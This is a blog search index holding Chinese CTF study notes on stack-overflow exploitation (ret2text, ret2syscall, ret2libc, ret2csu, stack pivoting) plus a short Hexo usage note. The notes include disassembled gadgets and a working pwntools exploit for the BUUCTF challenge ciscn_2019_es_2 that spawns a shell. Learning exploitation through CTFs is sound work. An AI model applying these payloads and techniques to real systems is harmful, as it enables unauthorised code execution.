<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>栈溢出</title>
    <link href="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理： 利用危险函数，将返回地址填充到栈帧上的返回地址，从<strong>控制该函数结束时返回到的地方</strong></p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h1 id="初级栈溢出"><a href="#初级栈溢出" class="headerlink" title="初级栈溢出"></a>初级栈溢出</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>利用<code>.text</code>段中的代码</p><p>确定填充长度后   构造payload即可</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul><li><p>shellcode</p><p>控制程序执行shellcode代码，常见功能是获取目标系统的shell，我们需向<strong>内存中填充一些可执行的代码</strong></p><p>意味着，<strong>shellcode所在区域需要有可执行的权限</strong></p></li></ul><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul><li><p>原理：</p><p>利用系统调用获取shell</p></li><li><p>系统调用知识补充：</p><p>跟函数没什么区别，不过我们所调用的函数是系统给的罢了</p><p><strong>系统调用号：rax</strong></p><p><strong>前6个参数：rdi rsi rdx r10 r8 r9</strong></p><ul><li><p>系统调用号</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x1.png" alt="32位"><br>                                                   <strong>32位</strong><br><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x2.png" alt="64位"><br>                                                   <strong>64位</strong></p></li></ul></li><li><p>ret2syscall</p><ul><li><p>寻找gadgets来控制寄存器为特定的值从而执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>工具：<code>ROPgadget --binary 可执行文件名  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p></li></ul></li></ul><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul><li><p>.plt与.got</p><p> <a href="https://blog.csdn.net/2301_80976241/article/details/144333148?ops_request_misc=%7B%22request_id%22:%22990dac9d47abe207078a2f01ce0ce74f%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=990dac9d47abe207078a2f01ce0ce74f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144333148-null-null.142%5Ev101%5Epc_search_result_base9&utm_term=plt%E4%B8%8Egot&spm=1018.2226.3001.4187">简单聊聊PLT和GOT_plt与got-CSDN博客</a> </p><p><strong>PLT（Procedure Linkage Table）</strong></p><p>PLT 是一个<strong>跳转表</strong>，跳转到got表，从而执行函数</p><p><strong>工作原理:</strong></p><p>当程序第一次调用共享库中的函数时，会通过 PLT 跳转到一个 stub 代码段。这个 stub 会将控制权转移到动态链接器(ld.so),动态链接器会在 GOT 中查找或解析目标函数的实际地址，<strong>然后更新 GOT 的对应条目</strong>,之后，<strong>再次调用同一函数时，PLT 会直接从 GOT 中读取已解析的地址并跳转到目标函数</strong>。</p><p><strong>GOT（Global Offset Table）</strong></p><p>GOT 是一个表，<strong>存储程序运行时需要使用的全局变量和函数的实际地址。</strong></p><p><strong>工作原理:</strong></p><p>程序加载时，GOT 的条目中存储的是共享库函数的默认入口地址（通常指向 PLT 中的 stub），当动态链接器解析了实际的函数地址后，<strong>会更新 GOT 对应的条目，使其指向正确的目标函数</strong>，之后，主程序对函数的调用直接通过 GOT 获取实际地址，提高效率。</p><p>也就是说，<strong>在使用一次函数后，got内存储的是真实地址</strong></p><p><strong>PLT 和 GOT协同找到正确的函数地址</strong><br>工作流程： 首先主程序中所有对共享库函数的调用，<strong>都会经过 PLT 跳转</strong>。然后PLT 中的第一跳通常指向 GOT 表中的一项。此时GOT 中的条目在未解析时会指向 PLT 中的 stub 地址，动态链接器负责更新 GOT 条目。解析完成后，<strong>GOT 保存目标函数的真实地址</strong>，后续调用直接通过 GOT 加快速度。</p></li><li><p>ret2libc</p><p>也就是利用libc中的system函数和&#x2F;bin&#x2F;sh的地址获取目标系统shell</p><p>利用泄露已知函数的真实地址，计算libc基地址，从而得到system与&#x2F;bin&#x2F;sh的真实地址，从而得到shell</p></li></ul><h1 id="中级栈溢出"><a href="#中级栈溢出" class="headerlink" title="中级栈溢出"></a>中级栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul><li>在64位程序中，前6个参数由寄存器传递，但大多数时候，难找到每一个寄存器的gadgets，这时可以利用_libc_csu_csu中的gadgets</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004005</span>C0 ; <span class="hljs-type">void</span> _libc_csu_init(<span class="hljs-type">void</span>)<br>.text:<span class="hljs-number">00000000004005</span>C0                 public __libc_csu_init<br>.text:<span class="hljs-number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="hljs-number">16</span>o<br>.text:<span class="hljs-number">00000000004005</span>C0                 push    r15<br>.text:<span class="hljs-number">00000000004005</span>C2                 push    r14<br>.text:<span class="hljs-number">00000000004005</span>C4                 mov     r15d, edi<br>.text:<span class="hljs-number">00000000004005</span>C7                 push    r13<br>.text:<span class="hljs-number">00000000004005</span>C9                 push    r12<br>.text:<span class="hljs-number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry<br>.text:<span class="hljs-number">00000000004005</span>D2                 push    rbp<br>.text:<span class="hljs-number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:<span class="hljs-number">00000000004005</span>DA                 push    rbx<br>.text:<span class="hljs-number">00000000004005</span>DB                 mov     r14, rsi<br>.text:<span class="hljs-number">00000000004005</span>DE                 mov     r13, rdx<br>.text:<span class="hljs-number">00000000004005E1</span>                 sub     rbp, r12<br>.text:<span class="hljs-number">00000000004005E4</span>                 sub     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000004005E8</span>                 sar     rbp, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004005</span>EC                 call    _init_proc<br>.text:<span class="hljs-number">00000000004005F</span>1                 test    rbp, rbp<br>.text:<span class="hljs-number">00000000004005F</span>4                 jz      <span class="hljs-type">short</span> loc_400616<br>.text:<span class="hljs-number">00000000004005F</span>6                 xor     ebx, ebx<br>.text:<span class="hljs-number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br>.text:<span class="hljs-number">0000000000400600</span><br>.text:<span class="hljs-number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>j<br><span class="hljs-comment">//主要利用以下模块</span><br>.text:<span class="hljs-number">0000000000400600</span>                 mov     rdx, r13<br>.text:<span class="hljs-number">0000000000400603</span>                 mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400606</span>                 mov     edi, r15d<br>.text:<span class="hljs-number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">000000000040060</span>D                 add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400611</span>                 cmp     rbx, rbp<br>.text:<span class="hljs-number">0000000000400614</span>                 jnz     <span class="hljs-type">short</span> loc_400600<br>.text:<span class="hljs-number">0000000000400616</span><br>.text:<span class="hljs-number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>j<br>.text:<span class="hljs-number">0000000000400616</span>                 add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040061</span>A                 pop     rbx<br>.text:<span class="hljs-number">000000000040061B</span>                 pop     rbp<br>.text:<span class="hljs-number">000000000040061</span>C                 pop     r12<br>.text:<span class="hljs-number">000000000040061</span>E                 pop     r13<br>.text:<span class="hljs-number">0000000000400620</span>                 pop     r14<br>.text:<span class="hljs-number">0000000000400622</span>                 pop     r15<br>.text:<span class="hljs-number">0000000000400624</span>                 retn<br>.text:<span class="hljs-number">0000000000400624</span> __libc_csu_init endp<br></code></pre></td></tr></table></figure><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 <strong>rbx,rbp,r12,r13,r14,r15</strong> 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将<strong>r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi</strong>（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 <strong>rbx+1 &#x3D; rbp</strong>，这样我们就<strong>不会执行</strong> loc_400600，进而可以继续执行下面的汇编程序，从而退出这个gadgets。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li></ul><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p> <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园</a> </p><ul><li>换个地方getshell</li></ul><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>溢出长度不够，<code>payload</code>长度收到限制无法执行getshell</p><ul><li>能够栈溢出，起码也要覆盖ebp</li><li>要有可写的地方<ul><li>bss段</li><li>栈中</li></ul></li></ul><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li><p>核心</p><p>两次的<code>leave,ret</code><br><code>leave：mov esp ebp;pop ebp</code></p><p><code>ret：pop eip</code></p></li><li><p>main函数里的栈迁移</p><p>第一次leave ret;将<strong>ebp给放入我们指定的位置</strong>（这个位置的就是迁移后的所在位置）</p><p>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是<strong>system函数的plt地址</strong>）</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%B8%80%E6%AC%A1.png" alt="第一次"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%BA%8C%E6%AC%A1.png" alt="第二次"></p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>buu的ciscn_2019_es_2</p><p> <a href="https://buuoj.cn/challenges#ciscn_2019_es_2">BUUCTF在线评测</a> </p><ul><li><p>checksec</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718391990.png" alt="1737718391990"></p></li><li><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718423112.png" alt="1737718423112"><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718435019.png" alt="1737718435019"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718474976.png" alt="1737718474976"></p></li><li><p>思路</p><p>就是利用栈迁移，将ebp覆盖成s顶部地址，将返回地址覆盖成leave,ret的地址即可</p><p>现在主要是要得到s顶部的地址，ida里可以<strong>利用第一个read将<code>\0</code>覆盖掉</strong>从而泄露ebp上的内容，计算偏移后得到s地址</p></li><li><p>计算偏移</p><p>将断点下载nop处，gdb调试</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719058637.png" alt="1737719058637"></p><p>得到偏移0x38</p></li><li><p>构造栈上数据</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719250596.png" alt="1737719250596"></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># r=remote(&quot;node5.buuoj.cn&quot;,25608)</span><br>r=process(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>leave_ret_addr=<span class="hljs-number">0x08048562</span><br>system_addr=<span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(r)</span><br><br>r.recvuntil(<span class="hljs-string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x25</span>+<span class="hljs-string">b&#x27;ANV&#x27;</span><br>r.send(payload1)  <span class="hljs-comment"># 注意这里要是send而不是sendline，否则在底下接收数据的时候会出错，因为多了一个回车那么就不再是recv到ANV了</span><br>r.recvuntil(<span class="hljs-string">&quot;ANV&quot;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br>s_addr=ebp-<span class="hljs-number">0x38</span><br>binsh_addr=s_addr+<span class="hljs-number">0x10</span> <span class="hljs-comment"># 栈上距离s填充四格，所以要加16，也就是0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s_addr))<br><br>payload2=<span class="hljs-string">b&#x27;AAAA&#x27;</span>+p32(system_addr)+p32(main_addr)+p32(binsh_addr)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(s_addr)+p32(leave_ret_addr)<br>r.send(payload2)<br><span class="hljs-comment"># pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure></li></ul><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>备注</title>
    <link href="/2025/01/18/%E5%A4%87%E6%B3%A8/"/>
    <url>/2025/01/18/%E5%A4%87%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> <span class="hljs-built_in">post</span> 文件名<br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>步骤</p><ol><li>将图片放入对于文件夹下</li><li>md中输入<code>![图片下的备注](图片名)</code></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
